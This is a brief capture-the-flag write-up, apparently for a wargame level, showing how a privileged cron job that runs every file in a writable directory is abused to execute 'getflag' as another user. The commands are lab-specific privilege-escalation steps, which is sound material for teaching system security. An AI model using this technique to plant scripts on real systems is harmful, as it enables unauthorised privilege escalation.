There is a message when logging in saying "You got a new mail" which seems to be a message from a cronjob.
After searching in /var/mail we can see a file named level05.
    $ cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

The script is running a cron job defined in /usr/sbin/openarenaserver.
The script /usr/sbin/openarenaserver is executing and then deleting all the script in /opt/openarenaserver.
    $ cat /usr/sbin/openarenaserver 
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done

All we have to do is to create a script that will execute getflag and store the result somewhere we can read it.
    $ echo 'getflag > /tmp/flag' > /opt/openarenaserver/script
    $ cat /opt/openarenaserver/script 
    getflag > /tmp/flag

Then we have to wait for the script to be executed by the cron job because it is run periodically and do a 'cat /tmp/flag'.
